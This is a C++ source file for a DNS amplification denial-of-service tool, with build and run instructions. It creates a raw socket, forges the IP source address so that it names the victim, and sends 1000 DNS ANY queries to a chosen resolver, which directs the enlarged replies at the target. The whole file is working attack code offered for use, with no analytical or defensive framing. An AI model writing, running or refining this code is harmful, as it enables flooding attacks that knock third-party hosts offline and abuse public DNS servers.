// Compile: g++ -o dns_amp dns_amp.cpp
// Run: sudo ./dns_amp <target_ip> <dns_server>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <unistd.h>

class DNSAmplification {
private:
    int sock;
    
    unsigned short checksum(void* data, int len) {
        unsigned short* buf = (unsigned short*)data;
        unsigned int sum = 0;
        while (len > 1) { sum += *buf++; len -= 2; }
        if (len == 1) sum += *(unsigned char*)buf;
        sum = (sum >> 16) + (sum & 0xFFFF);
        sum += (sum >> 16);
        return ~sum;
    }
    
public:
    DNSAmplification() {
        sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        if (sock < 0) { perror("socket"); exit(1); }
    }
    
    void amplify(const char* targetIP, const char* dnsServer, int count = 100) {
        struct sockaddr_in target;
        target.sin_family = AF_INET;
        target.sin_port = htons(53);
        target.sin_addr.s_addr = inet_addr(dnsServer);
        
        // Craft DNS ANY query for amplification
        char dnsQuery[] = {
            0xaa, 0xaa,  // Transaction ID
            0x01, 0x00,  // Flags
            0x00, 0x01,  // Questions
            0x00, 0x00,  // Answers
            0x00, 0x00,  // Authority
            0x00, 0x00,  // Additional
            // Query: isc.org
            0x03, 'i', 's', 'c',
            0x03, 'o', 'r', 'g',
            0x00,
            0x00, 0xff,  // Type ANY
            0x00, 0x01   // Class IN
        };
        
        for (int i = 0; i < count; i++) {
            char packet[4096];
            struct iphdr* ip = (struct iphdr*)packet;
            struct udphdr* udp = (struct udphdr*)(packet + sizeof(struct iphdr));
            
            memset(packet, 0, 4096);
            
            memcpy(packet + sizeof(struct iphdr) + sizeof(struct udphdr), 
                   dnsQuery, sizeof(dnsQuery));
            
            int dnsLen = sizeof(dnsQuery);
            
            udp->source = htons(rand() % 65535);
            udp->dest = htons(53);
            udp->len = htons(sizeof(struct udphdr) + dnsLen);
            udp->check = 0;
            
            ip->ihl = 5;
            ip->version = 4;
            ip->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + dnsLen;
            ip->ttl = 64;
            ip->protocol = IPPROTO_UDP;
            ip->saddr = inet_addr(targetIP);  // Spoofed source
            ip->daddr = target.sin_addr.s_addr;
            ip->check = checksum(ip, sizeof(struct iphdr));
            
            sendto(sock, packet, ip->tot_len, 0, 
                   (struct sockaddr*)&target, sizeof(target));
        }
    }
    
    ~DNSAmplification() { close(sock); }
};

int main(int argc, char* argv[]) {
    if (argc != 3) {
        std::cerr << "Usage: " << argv[0] << " <target_ip> <dns_server>\n";
        return 1;
    }
    DNSAmplification amp;
    amp.amplify(argv[1], argv[2], 1000);
    return 0;
}